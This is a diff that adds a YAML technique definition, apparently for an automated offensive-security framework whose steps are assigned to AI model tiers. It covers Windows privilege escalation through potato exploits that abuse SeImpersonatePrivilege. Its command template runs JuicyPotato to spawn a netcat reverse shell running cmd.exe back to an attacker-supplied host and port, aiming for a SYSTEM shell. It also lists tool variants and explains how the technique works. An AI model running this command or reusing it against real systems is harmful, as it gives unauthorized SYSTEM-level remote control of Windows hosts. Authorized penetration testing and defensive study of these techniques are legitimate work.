@@ -1,0 +1,17 @@
+name: potato_attack
+category: privesc
+description: Windows token impersonation via potato exploits (SeImpersonate)
+preconditions:
+  - os==windows
+parameters:
+  lhost: from_engagement.attacker_ip
+  lport: from_engagement.lport
+command_template: "JuicyPotato.exe -l 1337 -p cmd.exe -a '/c nc.exe {lhost} {lport} -e cmd.exe' -t *"
+parser: null
+expected_effects:
+  - system_shell_obtained
+falsifier:
+  pattern: "CreateProcessWithToken failed|error"
+  timeout: 60
+model_tier: haiku
+mechanism: "Requires SeImpersonatePrivilege (default for service accounts, IIS, MSSQL). Variants: JuicyPotato (Server 2016/2019), PrintSpoofer (all), GodPotato (all), SweetPotato. Creates SYSTEM-level token via DCOM/RPC NTLM auth to localhost."
